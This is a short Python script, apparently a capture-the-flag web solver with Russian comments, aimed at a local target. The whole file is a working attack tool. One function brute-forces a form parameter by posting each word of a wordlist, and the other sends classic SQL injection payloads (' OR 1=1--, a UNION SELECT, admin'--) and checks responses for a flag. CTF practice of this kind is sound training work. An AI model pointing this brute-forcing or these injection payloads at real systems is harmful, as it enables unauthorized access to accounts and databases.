import requests, sys
from urllib.parse import quote

# Настройка
TARGET = "http://127.0.0.1:8080"
HEADERS = {"User-Agent": "CTF-Bot/1.0"}
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def brute_force(endpoint, param, wordlist):
    s = requests.Session()
    for word in open(wordlist):
        word = word.strip()
        r = s.post(f"{TARGET}{endpoint}", 
                   data={param: word}, headers=HEADERS, proxies=PROXY, verify=False)
        if "incorrect" not in r.text.lower() and r.status_code == 200:
            print(f"✅ SUCCESS: {param}={word}")
            print(r.text[:200])
            return
    print("❌ Not found")

def sql_inject(endpoint, param):
    payloads = ["' OR 1=1--", "' UNION SELECT 1,2,3--", "admin'--"]
    s = requests.Session()
    for p in payloads:
        r = s.get(f"{TARGET}{endpoint}?{param}={quote(p)}", proxies=PROXY, verify=False)
        if "flag" in r.text.lower():
            print(f"✅ SQLi hit: {p}")
            return
    print("❌ SQLi failed")

if __name__ == "__main__":
    # Пример: python3 solve_web.py sql /search query
    if "sql" in sys.argv[1]: sql_inject(sys.argv[2], sys.argv[3])
    elif "brute" in sys.argv[1]: brute_force(sys.argv[2], sys.argv[3], sys.argv[4])